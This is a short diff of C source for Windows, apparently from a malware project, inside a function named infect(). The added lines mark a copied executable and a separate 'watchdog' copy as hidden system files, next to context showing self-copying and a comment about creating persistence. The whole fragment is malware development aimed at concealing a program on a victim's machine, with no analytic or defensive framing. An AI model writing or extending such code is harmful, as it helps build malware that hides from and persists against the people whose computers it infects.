@@ -71,6 +71,9 @@ void infect(){
         printf("Error copying file: %d\n", GetLastError());
         return;
     }
+    SetFileAttributesA(executableDestination, 
+                        FILE_ATTRIBUTE_HIDDEN | 
+                        FILE_ATTRIBUTE_SYSTEM);    // Set the attributes to hidden & system
 
 
     // Copy the executable into the watchdog destination
@@ -88,6 +91,9 @@ void infect(){
         printf("Error copying file: %d\n", GetLastError());
         return;
     }
+    SetFileAttributesA(watchdogDestination, 
+                        FILE_ATTRIBUTE_HIDDEN | 
+                        FILE_ATTRIBUTE_SYSTEM); // Set the attributes to hidden & system
 
 
     /* Create persistance */
